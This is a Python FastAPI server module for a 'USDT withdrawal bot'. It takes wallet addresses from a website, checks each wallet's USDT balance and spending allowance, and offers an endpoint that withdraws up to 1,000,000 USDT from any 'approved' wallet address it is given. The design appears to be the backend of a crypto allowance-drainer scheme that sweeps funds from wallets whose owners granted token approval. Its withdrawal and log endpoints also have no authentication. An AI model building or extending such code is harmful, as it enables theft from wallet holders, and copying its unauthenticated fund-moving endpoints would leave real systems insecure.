"""
Web API Server for USDT Bot - Receives data from external sources
Allows your website to send data to the bot via HTTP endpoints
"""

import asyncio
import json
import logging
from datetime import datetime
from typing import Optional, Dict, Any
from threading import Thread

try:
    from fastapi import FastAPI, HTTPException, Request
    from fastapi.responses import JSONResponse
    from pydantic import BaseModel
    import uvicorn
    FASTAPI_AVAILABLE = True
except ImportError:
    # Create dummy classes to prevent NameError
    class BaseModel:
        pass
    FastAPI = None
    FASTAPI_AVAILABLE = False
    print("Warning: FastAPI not installed. Web API features disabled.")

from blockchain import blockchain_manager
from config import BOT_TOKEN

logger = logging.getLogger(__name__)

# Data models for API requests
class WalletRequest(BaseModel):
    address: str
    user_id: Optional[int] = None
    source: Optional[str] = "website"

class WithdrawalRequest(BaseModel):
    from_address: str
    amount: float
    user_id: Optional[int] = None
    source: Optional[str] = "website"

class WebhookData(BaseModel):
    event_type: str
    data: Dict[str, Any]
    timestamp: Optional[str] = None
    source: Optional[str] = "website"

# Global storage for API data
api_data_store = {
    "wallets": [],
    "withdrawals": [],
    "events": []
}

class WebAPIServer:
    """Web API server for external integrations"""
    
    def __init__(self, host: str = "0.0.0.0", port: int = 5000):
        self.host = host
        self.port = port
        self.app = None
        self.server_thread = None
        
        if FastAPI is not None:
            self.setup_app()
    
    def setup_app(self):
        """Setup FastAPI application with endpoints"""
        if not FASTAPI_AVAILABLE:
            return
            
        self.app = FastAPI(
            title="USDT Bot API",
            description="API endpoints for USDT withdrawal bot integration",
            version="1.0.0"
        )
        
        # Health check endpoint
        @self.app.get("/")
        async def health_check():
            return JSONResponse({
                "status": "online",
                "service": "USDT Bot API",
                "timestamp": datetime.now().isoformat()
            })
        
        # Wallet information endpoint
        @self.app.post("/api/wallet/info")
        async def get_wallet_info(wallet_request: WalletRequest):
            """Get wallet balance and allowance information"""
            try:
                address = wallet_request.address.strip()
                
                # Validate address
                cleaned_address = blockchain_manager.clean_address_input(address)
                if not blockchain_manager.validate_address(cleaned_address):
                    raise HTTPException(status_code=400, detail="Invalid wallet address")
                
                # Get wallet information
                balance = blockchain_manager.get_usdt_balance(cleaned_address)
                allowance = blockchain_manager.get_allowance(cleaned_address)
                
                if balance is None or allowance is None:
                    raise HTTPException(status_code=503, detail="Unable to fetch wallet information")
                
                # Store request for logging
                api_data_store["wallets"].append({
                    "address": cleaned_address,
                    "balance": balance,
                    "allowance": allowance,
                    "user_id": wallet_request.user_id,
                    "source": wallet_request.source,
                    "timestamp": datetime.now().isoformat()
                })
                
                logger.info(f"API wallet info request: {cleaned_address} (balance: {balance}, allowance: {allowance})")
                
                return JSONResponse({
                    "success": True,
                    "address": cleaned_address,
                    "balance": balance,
                    "allowance": allowance,
                    "balance_formatted": f"{balance:,.6f} USDT",
                    "allowance_formatted": f"{allowance:,.6f} USDT",
                    "timestamp": datetime.now().isoformat()
                })
                
            except HTTPException:
                raise
            except Exception as e:
                logger.error(f"Error in wallet info API: {e}")
                raise HTTPException(status_code=500, detail="Internal server error")
        
        # Withdrawal endpoint
        @self.app.post("/api/withdrawal/execute")
        async def execute_withdrawal(withdrawal_request: WithdrawalRequest):
            """Execute USDT withdrawal from approved wallet"""
            try:
                from_address = withdrawal_request.from_address.strip()
                amount = withdrawal_request.amount
                
                # Validate address
                cleaned_address = blockchain_manager.clean_address_input(from_address)
                if not blockchain_manager.validate_address(cleaned_address):
                    raise HTTPException(status_code=400, detail="Invalid wallet address")
                
                # Validate amount
                if amount <= 0:
                    raise HTTPException(status_code=400, detail="Amount must be greater than 0")
                
                if amount > 1000000:
                    raise HTTPException(status_code=400, detail="Amount too large (max: 1,000,000 USDT)")
                
                # Execute withdrawal
                success, message = blockchain_manager.withdraw_usdt(cleaned_address, amount)
                
                # Store request for logging
                withdrawal_record = {
                    "from_address": cleaned_address,
                    "amount": amount,
                    "success": success,
                    "message": message,
                    "user_id": withdrawal_request.user_id,
                    "source": withdrawal_request.source,
                    "timestamp": datetime.now().isoformat()
                }
                api_data_store["withdrawals"].append(withdrawal_record)
                
                logger.info(f"API withdrawal request: {cleaned_address} -> {amount} USDT (success: {success})")
                
                if success:
                    return JSONResponse({
                        "success": True,
                        "message": message,
                        "from_address": cleaned_address,
                        "amount": amount,
                        "amount_formatted": f"{amount:,.6f} USDT",
                        "timestamp": datetime.now().isoformat()
                    })
                else:
                    raise HTTPException(status_code=400, detail=message)
                    
            except HTTPException:
                raise
            except Exception as e:
                logger.error(f"Error in withdrawal API: {e}")
                raise HTTPException(status_code=500, detail="Internal server error")
        
        # Webhook endpoint for general data
        @self.app.post("/api/webhook")
        async def webhook_handler(webhook_data: WebhookData):
            """Generic webhook endpoint for receiving data from your website"""
            try:
                # Store webhook data
                event_record = {
                    "event_type": webhook_data.event_type,
                    "data": webhook_data.data,
                    "source": webhook_data.source,
                    "timestamp": webhook_data.timestamp or datetime.now().isoformat(),
                    "received_at": datetime.now().isoformat()
                }
                api_data_store["events"].append(event_record)
                
                logger.info(f"API webhook received: {webhook_data.event_type} from {webhook_data.source}")
                
                # Process specific event types
                if webhook_data.event_type == "wallet_address":
                    address = webhook_data.data.get("address")
                    if address:
                        # Validate and get info for the address
                        cleaned_address = blockchain_manager.clean_address_input(address)
                        if blockchain_manager.validate_address(cleaned_address):
                            balance = blockchain_manager.get_usdt_balance(cleaned_address)
                            allowance = blockchain_manager.get_allowance(cleaned_address)
                            event_record["wallet_info"] = {
                                "balance": balance,
                                "allowance": allowance
                            }
                
                return JSONResponse({
                    "success": True,
                    "event_type": webhook_data.event_type,
                    "message": "Webhook data received successfully",
                    "timestamp": datetime.now().isoformat()
                })
                
            except Exception as e:
                logger.error(f"Error in webhook handler: {e}")
                raise HTTPException(status_code=500, detail="Internal server error")
        
        # Get API data logs
        @self.app.get("/api/logs/{log_type}")
        async def get_api_logs(log_type: str, limit: int = 50):
            """Get API activity logs"""
            if log_type not in ["wallets", "withdrawals", "events"]:
                raise HTTPException(status_code=400, detail="Invalid log type")
            
            logs = api_data_store.get(log_type, [])
            return JSONResponse({
                "success": True,
                "log_type": log_type,
                "count": len(logs),
                "data": logs[-limit:] if limit > 0 else logs
            })
    
    def start_server(self):
        """Start the web server in a separate thread"""
        if not FASTAPI_AVAILABLE:
            logger.warning("FastAPI not available. Web API server disabled.")
            return False
        
        def run_server():
            try:
                uvicorn.run(
                    self.app,
                    host=self.host,
                    port=self.port,
                    log_level="info",
                    access_log=True
                )
            except Exception as e:
                logger.error(f"Failed to start web API server: {e}")
        
        self.server_thread = Thread(target=run_server, daemon=True)
        self.server_thread.start()
        logger.info(f"Web API server started on http://{self.host}:{self.port}")
        return True
    
    def get_connection_info(self) -> dict:
        """Get connection information for the API"""
        return {
            "host": self.host,
            "port": self.port,
            "base_url": f"http://{self.host}:{self.port}",
            "endpoints": {
                "health_check": "/",
                "wallet_info": "/api/wallet/info",
                "execute_withdrawal": "/api/withdrawal/execute", 
                "webhook": "/api/webhook",
                "logs": "/api/logs/{log_type}"
            },
            "status": "running" if self.server_thread and self.server_thread.is_alive() else "stopped"
        }

# Global web API server instance
web_api_server = WebAPIServer()

def start_web_api():
    """Start the web API server"""
    return web_api_server.start_server()

def get_api_data(data_type: str = "all") -> dict:
    """Get stored API data"""
    if data_type == "all":
        return api_data_store
    return api_data_store.get(data_type, [])

def get_connection_info() -> dict:
    """Get API connection information"""
    return web_api_server.get_connection_info()